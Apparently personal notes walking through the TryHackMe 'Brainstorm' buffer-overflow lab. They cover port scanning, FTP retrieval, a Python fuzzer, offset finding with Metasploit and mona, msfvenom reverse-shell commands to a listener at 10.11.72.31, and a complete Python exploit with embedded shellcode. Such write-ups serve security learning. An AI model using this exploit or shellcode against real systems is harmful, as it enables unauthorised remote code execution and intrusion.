<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>brainstorm</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>brainstorm</h1><br/><p><strong>Brainstorm</strong></p><p></p><p>Nmap Shows 3 open ports: 21,3389,9999</p><p></p><p>FTP : 21</p><p>RDP : 3389</p><p>Chat Service : 9999 (Found out after connecting)</p><p></p><p>THM answer for No of Open ports: 6</p><p></p><p></p><p>We connect to the machine with anonymous ftp login.</p><p>Change mode to passive. (Else the “ls” command is stuck and won&#39;t work)</p><p></p><p></p><p><img src="images/14-1.png" alt="images/14-1.png" /></p><p></p><p>Changed to Binary mode using “<strong>binary</strong>” before tranferring the files.</p><p></p><p><img src="images/14-2.png" alt="images/14-2.png" /></p><p></p><p>Run the executible in a local windows 10 machine for research.</p><p></p><p>We fuzz the machine using the following fuzzer.</p><p></p><p>#!/usr/bin/env python3</p><p></p><p>import socket, time, sys</p><p></p><p>ip = &quot;11.11.11.123&quot;</p><p></p><p>port = 9999</p><p>timeout = 5</p><p></p><p>prefix = &quot;&quot;</p><p>string = prefix + &quot;A&quot; * 100</p><p></p><p>while True:</p><p>  try:</p><p>    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p><p>      s.settimeout(timeout)</p><p>      s.connect((ip, port))</p><p>      s.recv(1024)</p><p>      print(&quot;Fuzzing Username: with {} bytes&quot;.format(len(string) - len(prefix)))</p><p>      s.send(bytes(string, &quot;latin-1&quot;))</p><p>      s.recv(1024)</p><p>      print(&quot;Fuzzing Message: with {} bytes&quot;.format(len(string) - len(prefix)))</p><p>      s.send(bytes(string, &quot;latin-1&quot;))</p><p>      s.recv(1024)</p><p>  except:</p><p>    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))</p><p>    sys.exit(0)</p><p>  string += 100 * &quot;A&quot;</p><p>  time.sleep(1)</p><p>  </p><p>  </p><p>  The program crashed at 2200 bytes.</p><p>  We create a pattern of 2200 bytes using metasploit tools.</p><p>  </p><p>  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200</p><p>  </p><p>  Then find the offset point using metasploit</p><p>  </p><p></p><p><img src="images/14-3.png" alt="images/14-3.png" /></p><p></p><p></p><p><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 31704330</strong></p><p></p><p><img src="images/14-4.png" alt="images/14-4.png" /></p><p></p><p>Or use mona script to find out offset <strong>2012</strong></p><p></p><p><img src="images/14-5.png" alt="images/14-5.png" /></p><p></p><p></p><p><strong>!mona findmsp -distance 2200</strong></p><p></p><p></p><p>Then i built the exploit the python file using the reverse enginering techniques.</p><p></p><p>A) Find badchars : “\x00” : No others were found</p><p></p><p>B) find jump point</p><p></p><p></p><p><img src="images/14-6.png" alt="images/14-6.png" /></p><p></p><p>Select a jump address and put it in retn using little endian format.</p><p><strong>625014EB</strong></p><p><strong>retn = &quot;\xEB\x14\x50\x62&quot;</strong></p><p><strong></strong></p><p>C) add NOP paddings. “\x90” * 16</p><p></p><p></p><p>D) put the shellcode in payload</p><p><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -e x86/shikata_ga_nai -b &quot;\x00&quot; -f python -v payload</strong></em></p><p>Internet Style to get a varibale named payload. (To copy paste as it is)</p><p></p><p><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -b &quot;\x00&quot; -f c</strong></em></p><p>Tryhackme style. (Copy the code part only into parenthesis of payload)</p><p></p><p></p><p>E) start the listener</p><p></p><p>F) run the exploit</p><p></p><p></p><p>Use the following python exploit.</p><p>#!/usr/bin/env python3</p><p></p><p>import socket, time, sys</p><p></p><p>ip = &quot;10.10.156.93&quot;</p><p>#625014EB</p><p>port = 9999</p><p>timeout = 5</p><p></p><p>username = &quot;brainstormZ&quot;</p><p>prefix = &quot;&quot;</p><p></p><p>offset = 2012</p><p>overflow = &quot;A&quot; * offset</p><p>retn = &quot;\xEB\x14\x50\x62&quot;</p><p>padding = &quot;\x90&quot; * 16</p><p>payload = (&quot;\xda\xde\xd9\x74\x24\xf4\xba\xb6\x9e\x8a\x34\x5e\x33\xc9\xb1&quot;</p><p>&quot;\x52\x31\x56\x17\x83\xee\xfc\x03\xe0\x8d\x68\xc1\xf0\x5a\xee&quot;</p><p>&quot;\x2a\x08\x9b\x8f\xa3\xed\xaa\x8f\xd0\x66\x9c\x3f\x92\x2a\x11&quot;</p><p>&quot;\xcb\xf6\xde\xa2\xb9\xde\xd1\x03\x77\x39\xdc\x94\x24\x79\x7f&quot;</p><p>&quot;\x17\x37\xae\x5f\x26\xf8\xa3\x9e\x6f\xe5\x4e\xf2\x38\x61\xfc&quot;</p><p>&quot;\xe2\x4d\x3f\x3d\x89\x1e\xd1\x45\x6e\xd6\xd0\x64\x21\x6c\x8b&quot;</p><p>&quot;\xa6\xc0\xa1\xa7\xee\xda\xa6\x82\xb9\x51\x1c\x78\x38\xb3\x6c&quot;</p><p>&quot;\x81\x97\xfa\x40\x70\xe9\x3b\x66\x6b\x9c\x35\x94\x16\xa7\x82&quot;</p><p>&quot;\xe6\xcc\x22\x10\x40\x86\x95\xfc\x70\x4b\x43\x77\x7e\x20\x07&quot;</p><p>&quot;\xdf\x63\xb7\xc4\x54\x9f\x3c\xeb\xba\x29\x06\xc8\x1e\x71\xdc&quot;</p><p>&quot;\x71\x07\xdf\xb3\x8e\x57\x80\x6c\x2b\x1c\x2d\x78\x46\x7f\x3a&quot;</p><p>&quot;\x4d\x6b\x7f\xba\xd9\xfc\x0c\x88\x46\x57\x9a\xa0\x0f\x71\x5d&quot;</p><p>&quot;\xc6\x25\xc5\xf1\x39\xc6\x36\xd8\xfd\x92\x66\x72\xd7\x9a\xec&quot;</p><p>&quot;\x82\xd8\x4e\xa2\xd2\x76\x21\x03\x82\x36\x91\xeb\xc8\xb8\xce&quot;</p><p>&quot;\x0c\xf3\x12\x67\xa6\x0e\xf5\x82\x3c\x58\x1a\xfb\x40\x58\x3a&quot;</p><p>&quot;\x9a\xcd\xbe\x28\x4c\x98\x69\xc5\xf5\x81\xe1\x74\xf9\x1f\x8c&quot;</p><p>&quot;\xb7\x71\xac\x71\x79\x72\xd9\x61\xee\x72\x94\xdb\xb9\x8d\x02&quot;</p><p>&quot;\x73\x25\x1f\xc9\x83\x20\x3c\x46\xd4\x65\xf2\x9f\xb0\x9b\xad&quot;</p><p>&quot;\x09\xa6\x61\x2b\x71\x62\xbe\x88\x7c\x6b\x33\xb4\x5a\x7b\x8d&quot;</p><p>&quot;\x35\xe7\x2f\x41\x60\xb1\x99\x27\xda\x73\x73\xfe\xb1\xdd\x13&quot;</p><p>&quot;\x87\xf9\xdd\x65\x88\xd7\xab\x89\x39\x8e\xed\xb6\xf6\x46\xfa&quot;</p><p>&quot;\xcf\xea\xf6\x05\x1a\xaf\x17\xe4\x8e\xda\xbf\xb1\x5b\x67\xa2&quot;</p><p>&quot;\x41\xb6\xa4\xdb\xc1\x32\x55\x18\xd9\x37\x50\x64\x5d\xa4\x28&quot;</p><p>&quot;\xf5\x08\xca\x9f\xf6\x18&quot;)</p><p></p><p>string = overflow + retn + padding + payload</p><p></p><p>overflow = &quot;A&quot; * offset</p><p>retn = &quot;&quot;</p><p>padding = &quot;&quot;</p><p>payload = &quot;&quot;</p><p>postfix = &quot;&quot;</p><p></p><p></p><p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p><p></p><p>try:</p><p>  s.connect((ip, port))</p><p>  print(&quot;Delivering Payload into brainstorm.&quot;)</p><p>  s.send(bytes(username, &quot;latin-1&quot;))</p><p>  time.sleep(1)</p><p>  s.send(bytes(string, &quot;latin-1&quot;))</p><p>  print(&quot;Done!&quot;)</p><p></p><p>except:</p><p>  print(&quot;Could not connect.&quot;)</p><p>  </p><p>  </p><p>  </p><p>  <img src="images/14-7.png" alt="images/14-7.png" /></p><p>  </p><p></p><p><img src="images/14-8.png" alt="images/14-8.png" /></p><p></p><p><img src="images/14-9.png" alt="images/14-9.png" /></p><p></p><p><img src="images/14-10.png" alt="images/14-10.png" /></p><p></p><p></p><p>Note: Much explanation is not there for exploit creation as it is completely same as the &quot;<strong>CybeXRay Guides -----→ Reverse Engineering -----→ Buffer Overflows Using ID &amp; mona</strong>&quot;</p><p></p></div>
</body>
</html>
